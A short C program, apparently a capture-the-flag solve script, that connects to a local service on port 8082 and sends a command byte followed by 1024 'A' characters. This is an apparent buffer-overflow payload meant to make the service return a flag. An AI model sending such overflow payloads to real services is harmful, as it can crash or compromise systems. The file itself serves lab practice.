#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 8082
#define BUFFER_SIZE 1024

int get_flag() {
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in serv_addr;

	serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)
        <= 0) {
        perror(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		perror("connect");
		return -1;
	}

	char payload[BUFFER_SIZE];
	for (int i = 0; i < BUFFER_SIZE; i++) {
		payload[i] = 'A';
	}

	write(sock, "\x03", 1);
	write(sock, payload, BUFFER_SIZE);

	char ans[256];
	read(sock, ans, 256);

	close(sock);

	printf("%s\n", ans);
	return 0;
}